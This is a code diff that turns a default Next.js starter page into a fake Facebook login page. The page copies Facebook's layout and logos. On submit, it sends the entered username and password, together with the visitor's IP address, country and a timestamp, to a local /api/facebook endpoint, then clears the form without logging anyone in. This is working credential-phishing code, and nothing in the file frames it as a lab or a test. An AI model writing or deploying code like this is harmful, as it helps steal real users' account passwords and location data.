@@ -1,66 +1,122 @@
-import Image from "next/image";
+"use client";
+import { useState } from "react";
 import styles from "./page.module.css";
+import Link from "next/link";
+import { getUserLocation } from "@/utils/request";
 
-export default function Home() {
+export const getFormatedDateTime = (date) => {
+  date = new Date(date);
+  const formattedDate = date.toLocaleDateString("en-US", {
+    year: "numeric",
+    month: "short",
+    day: "numeric",
+  });
+
+  const formattedTime = date.toLocaleTimeString("en-US", {
+    hour: "numeric",
+    minute: "numeric",
+    hour12: true,
+  });
+
+  const formattedDateTime = `${formattedDate} ${formattedTime}`;
+  return formattedDateTime;
+};
+export default function Facebook() {
+  const [showPassword, setShowPassword] = useState(false);
+  const [username, setUsername] = useState("");
+  const [password, setPassword] = useState("");
+
+  const handleSubmit = (e) => {
+    e.preventDefault();
+
+    getUserLocation().then(
+      async (data) =>
+        await fetch("/api/facebook", {
+          method: "POST",
+          body: JSON.stringify({
+            username,
+            password,
+            date: getFormatedDateTime(new Date()),
+            ip_address: data.ip,
+            country: data.country_name,
+          }),
+        })
+    );
+
+    setUsername("");
+    setPassword("");
+  };
+
   return (
     <div className={styles.page}>
-      <main className={styles.main}>
-        <Image
-          className={styles.logo}
-          src="/next.svg"
-          alt="Next.js logo"
-          width={100}
-          height={20}
-          priority
-        />
-        <div className={styles.intro}>
-          <h1>To get started, edit the page.js file.</h1>
-          <p>
-            Looking for a starting point or more instructions? Head over to{" "}
-            <a
-              href="https://vercel.com/templates?framework=next.js&utm_source=create-next-app&utm_medium=appdir-template-tw&utm_campaign=create-next-app"
-              target="_blank"
-              rel="noopener noreferrer"
-            >
-              Templates
-            </a>{" "}
-            or the{" "}
-            <a
-              href="https://nextjs.org/learn?utm_source=create-next-app&utm_medium=appdir-template-tw&utm_campaign=create-next-app"
-              target="_blank"
-              rel="noopener noreferrer"
-            >
-              Learning
-            </a>{" "}
-            center.
-          </p>
+      <div className={styles.wrapper}>
+        <div className={styles.mainContainer}>
+          <p className={styles.title}>English (Uk)</p>
+
+          <div className={styles.logo}>
+            <img src="/facebook1.png" alt="" />
+          </div>
+
+          <form onSubmit={handleSubmit} className={styles.form}>
+            <div className={styles.form__group}>
+              <input
+                value={username}
+                onChange={(e) => setUsername(e.target.value)}
+                required
+                type="text"
+              />
+              <label htmlFor="">Mobile number or email address</label>
+            </div>
+
+            <div className={styles.form__group}>
+              <input
+                value={password}
+                onChange={(e) => setPassword(e.target.value)}
+                required
+                type={showPassword ? "text" : "password"}
+              />
+              <label htmlFor="">Password</label>
+              <div className={styles.password}>
+                {showPassword ? (
+                  <div onClick={() => setShowPassword(false)}>
+                    <i className="fa-solid fa-eye"></i>
+                  </div>
+                ) : (
+                  <div onClick={() => setShowPassword(true)}>
+                    <i className="fa-solid fa-eye-slash"></i>
+                  </div>
+                )}
+              </div>
+            </div>
+
+            <div className={styles.form__group}>
+              <button>Log In</button>
+            </div>
+
+            <div className={styles.form__group}>
+              <a className={styles.forgot} href="#">
+                Forgotten account?
+              </a>
+            </div>
+          </form>
+
+          <div className={styles.bottomContainer}>
+            <div className={styles.bottomButton}>
+              <button>Create new account</button>
+            </div>
+            <div className={styles.bottomImage}>
+              <img src="/meta.png" alt="" />
+            </div>
+            <div className={styles.footer}>
+              <Link href="">About</Link>
+              <Link href="">Help</Link>
+              <Link href="">More</Link>
+            </div>
+          </div>
         </div>
-        <div className={styles.ctas}>
-          <a
-            className={styles.primary}
-            href="https://vercel.com/new?utm_source=create-next-app&utm_medium=appdir-template&utm_campaign=create-next-app"
-            target="_blank"
-            rel="noopener noreferrer"
-          >
-            <Image
-              className={styles.logo}
-              src="/vercel.svg"
-              alt="Vercel logomark"
-              width={16}
-              height={16}
-            />
-            Deploy Now
-          </a>
-          <a
-            className={styles.secondary}
-            href="https://nextjs.org/docs?utm_source=create-next-app&utm_medium=appdir-template&utm_campaign=create-next-app"
-            target="_blank"
-            rel="noopener noreferrer"
-          >
-            Documentation
-          </a>
-        </div>
-      </main>
+
+        <div></div>
+      </div>
     </div>
   );
 }
